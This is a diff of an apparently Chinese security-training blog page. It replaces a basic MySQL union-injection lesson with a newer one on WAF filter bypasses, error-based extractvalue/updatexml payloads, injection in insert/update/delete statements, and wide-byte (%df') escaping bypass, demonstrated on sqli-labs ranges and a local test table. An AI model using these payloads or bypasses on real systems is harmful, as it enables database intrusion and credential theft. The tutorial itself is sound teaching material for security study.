@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
-<title>1.5 mysql注入初步</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="应对WAF(网页防火墙) 过滤空格 使用下面的URL编码尝试替代空格：\n%20 标准空格\n%09 水平tab键\n%0a 新建一行\n%0c 新建一页\n%0d 回车键\n%0b 垂直tab键\n%a0 也是空格键\n特殊的，对于两个不同语法单元之间的空格也可以用运算符来代替：\n">
+<title>1.23 SQL注入系列-3</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.5 mysql注入初步">
-<meta property='og:description' content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
-<meta property='og:url' content='https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.23 SQL注入系列-3">
+<meta property='og:description' content="应对WAF(网页防火墙) 过滤空格 使用下面的URL编码尝试替代空格：\n%20 标准空格\n%09 水平tab键\n%0a 新建一行\n%0c 新建一页\n%0d 回车键\n%0b 垂直tab键\n%a0 也是空格键\n特殊的，对于两个不同语法单元之间的空格也可以用运算符来代替：\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-28T20:07:03&#43;08:00'/><meta property='article:modified_time' content='2025-11-28T20:07:03&#43;08:00'/>
-<meta name="twitter:title" content="1.5 mysql注入初步">
-<meta name="twitter:description" content="GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-23T20:44:35&#43;08:00'/><meta property='article:modified_time' content='2026-01-23T20:44:35&#43;08:00'/>
+<meta name="twitter:title" content="1.23 SQL注入系列-3">
+<meta name="twitter:description" content="应对WAF(网页防火墙) 过滤空格 使用下面的URL编码尝试替代空格：\n%20 标准空格\n%09 水平tab键\n%0a 新建一行\n%0c 新建一页\n%0d 回车键\n%0b 垂直tab键\n%a0 也是空格键\n特殊的，对于两个不同语法单元之间的空格也可以用运算符来代替：\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,29 +319,30 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#手动注入order-by与联合查询注入">手动注入(ORDER BY与联合查询注入)</a>
+    <li><a href="#应对waf网页防火墙">应对WAF(网页防火墙)</a>
       <ol>
-        <li><a href="#step1破坏数据库语句">Step1：破坏数据库语句</a></li>
-        <li><a href="#step2确定查询了多少个栏目">Step2：确定查询了多少个栏目</a></li>
-        <li><a href="#step3显示报错位">Step3：显示报错位</a></li>
-        <li><a href="#step4查看数据库的库名">Step4：查看数据库的库名</a></li>
-        <li><a href="#step5根据库名查看表名">Step5：根据库名查看表名</a></li>
-        <li><a href="#step6查询所需表的列栏目名">Step6：查询所需表的列（栏目）名</a></li>
-        <li><a href="#step7全部取出username及对应password">Step7：全部取出username及对应password</a>
-          <ol>
-            <li><a href="#方法一group_concat语法">方法一：group_concat()语法</a></li>
-            <li><a href="#方法二limit-ab-语法">方法二：limit a,b 语法</a></li>
-          </ol>
-        </li>
+        <li><a href="#过滤空格">过滤空格</a></li>
+        <li><a href="#过滤注释符">过滤注释符</a></li>
+        <li><a href="#过滤andor">过滤and、or</a></li>
+        <li><a href="#过滤-等重要符号">过滤<code>-``/``\</code>等重要符号</a></li>
+        <li><a href="#过滤unionselect等重要单词">过滤union、select等重要单词</a></li>
       </ol>
     </li>
-    <li><a href="#工具辅助注入">工具辅助注入</a>
+    <li><a href="#利用insertupdate和delete进行注入-">利用insert、update和delete进行注入 <strong>[1]</strong></a>
       <ol>
-        <li><a href="#sqlmap-用法使用kali版本">sqlmap 用法（使用Kali版本）</a></li>
-        <li><a href="#略微引申post类型的注入">略微引申：POST类型的注入</a></li>
+        <li><a href="#思路简要说明">思路简要说明</a></li>
+        <li><a href="#本地测试">本地测试</a></li>
       </ol>
     </li>
-    <li><a href="#拓展知识">拓展知识</a></li>
+    <li><a href="#宽字节注入">宽字节注入</a>
+      <ol>
+        <li><a href="#宽字节概念">宽字节概念</a></li>
+        <li><a href="#注入原理">注入原理</a></li>
+        <li><a href="#小测验less-32">小测验（Less-32）</a></li>
+        <li><a href="#使用sqlmap进行宽字节注入">使用sqlmap进行宽字节注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#参考文献">参考文献</a></li>
   </ol>
 </nav>
         </div>
@@ -364,8 +365,8 @@
                 网安
             </a>
         
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
-                渗透测试微专业
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
             </a>
         
     </header>
@@ -373,13 +374,9 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/">1.5 mysql注入初步</a>
+            <a href="/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/">1.23 SQL注入系列-3</a>
         </h2>
     
-        
-        <h3 class="article-subtitle">
-            GET类型的mysql类数据库注入初步教程，包括手动和工具辅助两部分
-        </h3>
         
     </div>
 
@@ -399,7 +396,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-11-28</time>
+                <time class="article-time--published">2026-01-23</time>
             </div>
         
 
@@ -422,14 +419,80 @@
     <section class="article-content">
     
     
-    <h2 id="手动注入order-by与联合查询注入">手动注入(ORDER BY与联合查询注入)
-</h2><p>以靶场<a class="link" href="http://sqlilabs.njhack.xyz/Less-1/index.php"  target="_blank" rel="noopener"
-    >http://sqlilabs.njhack.xyz/Less-1/index.php</a>为例</p>
-<h3 id="step1破坏数据库语句">Step1：破坏数据库语句
-</h3><blockquote>
-<p>破坏数据库语句的目的就是让数据库报错，通过报错信息猜测查询语句的写法</p>
-</blockquote>
-<p>数据库传入参数的几种闭合方式：</p>
+    <h2 id="应对waf网页防火墙">应对WAF(网页防火墙)
+</h2><h3 id="过滤空格">过滤空格
+</h3><p>使用下面的URL编码尝试替代空格：</p>
+<p><code>%20</code> 标准空格</p>
+<p><code>%09</code> 水平tab键</p>
+<p><code>%0a</code> 新建一行</p>
+<p><code>%0c</code> 新建一页</p>
+<p><code>%0d</code> 回车键</p>
+<p><code>%0b</code> 垂直tab键</p>
+<p><code>%a0</code> 也是空格键</p>
+<p>特殊的，对于两个不同语法单元之间的空格也可以用运算符来代替：</p>
+<p><code>||</code>：逻辑或运算符（注意：MySQL 中默认 || 是逻辑或，和OR等价，部分环境需配置）</p>
+<p><code>&amp;</code>：位与运算符</p>
+<p><code>^</code>：位异或运算符</p>
+<p><code>+</code>：算术加法运算符（前提是左右两边可转换为数字）</p>
+<p><strong>例如：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">?id=1&#39;|extractvalue(1,concat(0x7e,database()));%00
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传入上面的参数后，因为select查询和extractvalue是两个无关的语法单元，所以可以用<code>|</code>连接。</p>
+<h3 id="过滤注释符">过滤注释符
+</h3><p>过滤注释符后我们的思路一般就是两种：</p>
+<ul>
+<li>将注释符换为截止符<code>%00</code></li>
+<li>使得查询语句中<code>$id</code>前后的符号都能闭合</li>
+</ul>
+<p>这里针对第二种进行讲解（以<strong>Less-23</strong>为例）：</p>
+<p>将前后两个单引号闭合再用<code>or</code>连接，即：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">?id=&#39; or extractvalue(1,concat(0x7e,database())) or&#39; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样在整个查询语句中就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=&#39;&#39; or extractvalue(1,concat(0x7e,database())) or&#39; &#39; LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过滤andor">过滤and、or
+</h3><p><strong>替换URL编码：</strong></p>
+<p><code>or</code> = <code>||</code> = <code>%7c%7c</code>(url编码)</p>
+<p><code>and</code> = <code>&amp;&amp;</code> = <code>%26%26</code>(url编码)</p>
+<p><strong>双写绕过：</strong></p>
+<p><code>or</code>&mdash;&gt;<code>oorr</code></p>
+<p><code>and</code>&ndash;&gt;<code>anandd</code></p>
+<h3 id="过滤-等重要符号">过滤<code>-``/``\</code>等重要符号
+</h3><p>使用URL编码绕过</p>
+<h3 id="过滤unionselect等重要单词">过滤union、select等重要单词
+</h3><ul>
+<li>随机其中几个字母大小写</li>
+<li>双写绕过</li>
+</ul>
+<h2 id="利用insertupdate和delete进行注入-">利用insert、update和delete进行注入 <strong>[1]</strong>
+</h2><h3 id="思路简要说明"><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">思路简要说明</font>
+</h3><p><code>insert</code>、<code>update</code>、<code>delete</code>注入的本质是<strong>参数未经过滤</strong>，攻击者可在语句的关键位置插入恶意 SQL 片段，利用数据库执行特性获取敏感数据，核心常用方法为报错注入，具体应用场景如下：</p>
+<ol>
+<li><strong>insert 注入</strong>：在<code>insert into 表名(字段1,字段2) values(值1,值2)</code>中，针对 “值 1”“值 2” 等参数构造恶意内容（如插入错误的函数调用、语法错误片段），触发数据库报错，通过错误提示回显数据库名、表名、字段名等信息。</li>
+<li><strong>update 注入</strong>：在<code>update 表名 set 字段=值 where 条件</code>中，针对 “值” 或 “条件” 部分注入恶意 SQL，例如构造含报错函数的语句，使数据库执行时抛出包含敏感数据的错误（如用户密码、权限信息等）。</li>
+<li><strong>delete 注入</strong>：在<code>delete from 表名 where 条件</code>中，针对 “条件” 参数注入恶意片段，通过触发报错或利用条件判断逻辑，间接获取数据或破坏数据完整性（注入核心以 “获取数据” 为目标时，优先通过报错回显实现）。</li>
+</ol>
+<h3 id="本地测试">本地测试
+</h3><p>执行下面的的命令创建测试用数据</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -440,189 +503,108 @@
 </span><span class="lnt">6
 </span><span class="lnt">7
 </span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&#39;&#39;
-</span></span><span class="line"><span class="cl">&#34;&#34;
-</span></span><span class="line"><span class="cl">()
-</span></span><span class="line"><span class="cl">((&#39;&#39;))
-</span></span><span class="line"><span class="cl">(&#34;&#34;)
-</span></span><span class="line"><span class="cl">((&#34;&#34;))
-</span></span><span class="line"><span class="cl">(())
-</span></span><span class="line"><span class="cl">没有闭合方式
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">create database newdb;
+</span></span><span class="line"><span class="cl">use newdb;
+</span></span><span class="line"><span class="cl">create table users (
+</span></span><span class="line"><span class="cl">    id int(3) not null auto_increment,
+</span></span><span class="line"><span class="cl">    username varchar(20) not null,
+</span></span><span class="line"><span class="cl">    passowrd varchar(20) not null,
+</span></span><span class="line"><span class="cl">    primary key(id)
+</span></span><span class="line"><span class="cl">);
+</span></span><span class="line"><span class="cl">insert into users values(1,&#39;janes&#39;,&#39;Eyre&#39;);
 </span></span></code></pre></td></tr></table>
 </div>
-</div><hr>
-<p><strong>补充1：</strong></p>
-<p><code>\</code>称为转义字符，可以把自己后面的第一个东西当作字符串去执行</p>
-<hr>
-<p>我们传入以下参数：<code>2\</code></p>
-<p>有如下报错：</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c3f5d4.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>我们选取其中核心部分<code>''2\' LIMIT 0,1'</code>去掉头尾<font style="color:#DF2A3F;">（因为头尾用来闭合的符号是php报错语句携带的，不是真实代码）</font></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="mi">2</span><span class="nx">\</span><span class="err">&#39;</span> <span class="nx">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>由此得知该数据库的查询语句是单引号<code>''</code>闭合</p>
-<p>因此大概估计查询语句可能为</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;$id&#39;</span> <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong><font style="color:#DF2A3F;">解释：</font></strong><font style="color:#DF2A3F;">此处</font><code>limit a,b</code><font style="color:#DF2A3F;">语法指从数据表的第a条起选取b条数据</font></p>
-<p><font style="color:#DF2A3F;">数据表条目要从第0个开始数</font></p>
-<hr>
-<p><strong>补充2：</strong></p>
-<ol>
-<li>数据库的注释符：<code>--</code>、<code>/**/</code>、<code>#</code></li>
-<li><code>+</code>在GET请求里相当于空格</li>
-</ol>
-<p><code>+</code>一般配合<code>--</code>作为GET请求的注释符使用</p>
-<hr>
-<p>接下来我们传入参数<code>id=2' --+</code>，那么拼成的语句是：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span> <span class="o">--+</span> <span class="err">&#39;</span><span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>由于<code>--</code>把后面的内容都注释掉了，实际上执行的数据库语句应该是：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="nx">username</span><span class="p">,</span><span class="nx">password</span> <span class="nx">from</span> <span class="nx">tablex</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>提交参数发现查询正常（如图），说明它真的是用<code>''</code>进行闭合的</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c43d19.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p><strong>后日谈：</strong> 也可以用永真或永假条件进行测试，即传入</p>
+</div><p>接下来我们通过单双引号包含的形式来人为构造语法错误实现报错。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">OR 1=1	//永真
-</span></span><span class="line"><span class="cl">OR 1=2	//永假
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">insert into users(id,username,passowrd) values (2,&#39;&#39;payload&#39;&#39;,&#39;testpwd&#39;);
+</span></span><span class="line"><span class="cl">insert into users(id,username,passowrd) values (3,&#34;&#34;payload&#34;&#34;,&#39;testpwd&#39;);
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="step2确定查询了多少个栏目">Step2：确定查询了多少个栏目
-</h3><p>从现在开始我们要调用各种语法查询数据，<font style="color:#DF2A3F;">记住之后的语法全部都是插入在</font><code>2' {} --+</code><font style="color:#DF2A3F;">中的花括号位置！</font></p>
-<p>因为之前的语句中username,password栏目是猜测的，所以接下来要核实究竟有多少个栏目</p>
-<p>传入参数<code>2' order by [数字] --+</code>使用二分法查看</p>
-<p>依次传参，其中数字填为10、5、3&hellip;&hellip;</p>
-<p>当数字最大为<strong>3</strong>时有结果，改为<strong>4</strong>时没有结果</p>
-<p>因此确定查询出了<strong>3</strong>个栏目，之前的猜测错误</p>
-<p>修正：可能的查询项目是<code>id,username,password</code></p>
-<h3 id="step3显示报错位">Step3：显示报错位
-</h3><p>传入参数<code>2' union select 1,2,3  --+</code>返回结果</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c8d1b4.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>但是我们想要让查询的1,2,3显示出来，所以要故意让<code>union</code>之前的查询语句出错掩盖掉正常数据</p>
-<p>传入参数<code>-2' union select 1,2,3  --+</code>返回结果</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c7a6ae.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>说明2、3号位是报错位（显示位）</p>
-<hr>
-<p><strong>补充3：</strong></p>
-<p><code>union select a,b,c</code>语法为<strong>联合查询</strong>，方便我们将两条查询语句捆绑起来一起执行，<font style="color:#DF2A3F;">而且即便其中一条查询语句报错也不影响另一条查询语句输出结果</font>，本地演示效果如下：</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f0c781ab.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>第二条select查询的1,2,3正好与前面查询的3个项目一一对应显示，<strong><font style="color:#DF2A3F;">因此第二条select内容务必参照Step2中获得的查询栏目数填写！</font></strong></p>
-<hr>
-<h3 id="step4查看数据库的库名">Step4：查看数据库的库名
-</h3><p>使用语法<code>database()</code>替换任意报错位</p>
-<p>传入参数<code>-2' union select 1,database(),3  --+</code>返回结果:</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f1fca874.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>此时2号位对应显示的就是数据库的库名：security</p>
-<h3 id="step5根据库名查看表名">Step5：根据库名查看表名
-</h3><p><strong>补充4：</strong></p>
-<p>数据库中一般有一个库名为<code>information_schema</code>其中有名为<code>TABLES</code>的数据表，里面统计了各个数据库名及其对应包含的表名，其中数据库名所在的列（栏目）为<code>TABLE_SCHNEMA</code>，数据表名所在的列（栏目）为<code>TABLE_NAME</code>，如图</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f2017a19.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<hr>
-<p>所以我们要编辑一下第二条查询语句让他能查询到<code>information_schema</code>库中<code>TABLES</code>表中的<code>TABLE_NAME</code>栏目，并且要限制条件TABLE_SCHEMA=&lsquo;security&rsquo;，整合一下需求：</p>
+</div><p>然后就大同小异了，插入我们的payload（以查看版本号为例）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">or</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">version</span><span class="p">())),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">//</span><span class="w"> </span><span class="err">标准句式就是：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">or</span><span class="w"> </span><span class="err">报错注入语句</span><span class="w"> </span><span class="k">or</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>其他报错注入语句请见</strong><a class="link" href="https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/"  target="_blank" rel="noopener"
+    >1.22 sql注入进阶</a></p>
+<p><strong>Insert:</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="err">&#39;</span>  <span class="o">--+</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">passowrd</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;haha&#39;</span><span class="w"> </span><span class="err">注入点</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;testpwd&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>为了方便一个个查询符合的数据（一个个查看security库中的表名）我们可以在第二条语句后面补充<code>limit 0,1</code>，之后依次修改前一个数字为1、2、3、4&hellip;&hellip;即可，也就是：</p>
+</div><p><strong>Update:</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="err">&#39;</span> <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">--+</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">update</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">passowrd</span><span class="o">=</span><span class="s1">&#39;testpwd&#39;</span><span class="w"> </span><span class="err">注入点</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;haha&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>传入参数后发现有4张表：<code>emails  referers  uagents  users</code></p>
-<p>显然<code>users</code>这个表对我们应该更有用</p>
-<h3 id="step6查询所需表的列栏目名">Step6：查询所需表的列（栏目）名
-</h3><p><strong>补充5：</strong></p>
-<p><code>information_schema</code>这个库中还有一个名为<code>COLUMNS</code>的表，里面记录了某个数据库（TABLE_SCHEMA）当中每个表（<code>TABLE_NAME</code>）里包含的栏目(<code>COLUMN_NAME</code>)</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f1fe187f.png"
+</div><p><strong>Delete:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">delete</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="err">注入点</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>此外，除了<code>or (payload) or</code>闭合格式，还有下面的其他闭合变种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;or (payload) or &#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; and (payload) and &#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; or (payload) and &#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; or (payload) and &#39;</span><span class="o">=</span><span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#34;- (payload) -&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="宽字节注入">宽字节注入
+</h2><blockquote>
+<p>在一些情况下，目标会使用诸如<code>addslashes()</code>、<code>mysql_real_escape_string()</code>、<code>mysql_escape_string()</code>、<code>Magic_quotes_gpc()</code>等函数对我们传入的内容进行转义，特别是引号之类的内容，这就会导致我们无法通过直接在参数里填入<code>'</code>来达成闭合，而宽字节注入就是为了解决这个问题。</p>
+</blockquote>
+<h3 id="宽字节概念">宽字节概念
+</h3><p>相对于单字节，我们引入一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。</p>
+<h3 id="注入原理">注入原理
+</h3><p>以<code>addslashes()</code>函数为例，它的目的是根据预定义的字符（由服务端根据需要配置，例如单双引号）在你传的参数中检查是否存在这些预定义字符，如果有就在前面加上一个<code>\</code>起到转义的作用。这样当你试图传入<code>?id=1'</code>时实际的参数为<code>?id=1\'</code>后面的引号失去了闭合作用。</p>
+<p>但假如我们像下面这样传参：<code>?id=%df'</code>🤔</p>
+<p>你先别急<code>%df</code>是什么意思，但是你肯定知道<code>\</code>的URL编码是<code>%5C</code>，这样一来参数在程序内部就变成了<code>%df%5C'</code>，而<code>%df%5C</code>实际上是[運]这个汉字的GBK编码，而MySQL会优先识别汉字的GBK编码**（前提是数据库本身就是GBK编码）**而忽略了转义符的存在，导致后面跟着的单引号仍然具有闭合作用。</p>
+<p>具有相似性质的汉字还有这些：<a class="link" href="https://free.picui.cn/free/2026/01/23/69732dc1d6518.webp"  target="_blank" rel="noopener"
+    >https://free.picui.cn/free/2026/01/23/69732dc1d6518.webp</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/webp/61753668/1769154090994-10ed85dc-904d-42d8-a534-b587c998d0c8.webp"
 	
 	
 	
